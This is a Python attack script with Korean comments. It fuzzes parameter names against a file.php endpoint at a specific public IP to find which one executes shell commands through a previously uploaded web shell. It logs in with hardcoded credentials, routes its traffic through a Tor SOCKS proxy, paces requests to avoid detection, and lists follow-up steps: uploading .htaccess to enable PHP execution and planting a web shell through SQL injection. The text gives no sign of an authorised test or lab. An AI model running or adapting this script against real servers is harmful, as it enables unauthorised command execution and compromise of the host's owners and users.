#!/usr/bin/env python3
"""
파라미터 퍼징
file.php가 받을 수 있는 다른 파라미터 찾기
"""

import requests
import sys
import time

target_ip = "43.201.154.142"
base_url = f"http://{target_ip}"

session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

print("="*60)
print("파라미터 퍼징 - cmd 우회")
print("="*60)

# alice 로그인
data = {'username': 'alice', 'password': 'alice2024'}
session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
print("[+] alice 세션\n")

# 테스트할 파라미터명들
params = [
    'cmd', 'command', 'exec', 'execute', 'run', 'do',
    'c', 'x', 'e', 'r', 'd',
    'shell', 'bash', 'sh',
    'system', 'sys',
    'code', 'eval',
    'action', 'act',
]

# 안전한 테스트 명령 (탐지 회피)
# echo 대신 특수한 문자열 출력
test_cmd = "echo XYZTEST123"

print(f"[*] {len(params)}개 파라미터 테스트 중...")
print(f"[*] 테스트 명령: {test_cmd}")
print(f"[*] 응답에 'XYZTEST123'이 있으면 성공\n")

working_params = []

for i, param in enumerate(params, 1):
    try:
        url = f"{base_url}/file.php?name=uploads/shell_4727.php&{param}={test_cmd}"

        resp = session.get(url, timeout=10)

        # 성공 여부 확인
        if 'XYZTEST123' in resp.text:
            print(f"[+] ✅ 작동: {param}")
            working_params.append(param)
        else:
            print(f"[-] {param}", end='\r')

    except Exception as e:
        print(f"[-] {param} (오류)", end='\r')

    # 탐지 회피 딜레이
    if i % 5 == 0:
        print(f"\n[*] 탐지 회피 대기 (10초)...")
        time.sleep(10)
    else:
        time.sleep(2)

print(f"\n\n{'='*60}")

if working_params:
    print(f"[+] ✅✅✅ 작동하는 파라미터 발견!")
    print(f"{'='*60}")

    for param in working_params:
        print(f"    - {param}")

    print(f"\n[*] 사용 예시:")
    print(f"    file.php?name=uploads/shell_4727.php&{working_params[0]}=whoami")

else:
    print(f"[-] 작동하는 파라미터 없음")
    print(f"{'='*60}")
    print(f"\n[*] 다음 가능성:")
    print(f"    1. file.php가 cmd 외 다른 파라미터 안 받음")
    print(f"    2. shell_exec() 자체가 막혔을 수도")
    print(f"    3. 웹쉘 파일이 PHP로 실행 안되고 텍스트로만 읽힘")
    print(f"\n[*] 대안:")
    print(f"    - .htaccess 업로드로 PHP 실행 활성화")
    print(f"    - 다른 업로드 페이지 찾기")
    print(f"    - SQL Injection으로 웹쉘 직접 생성")
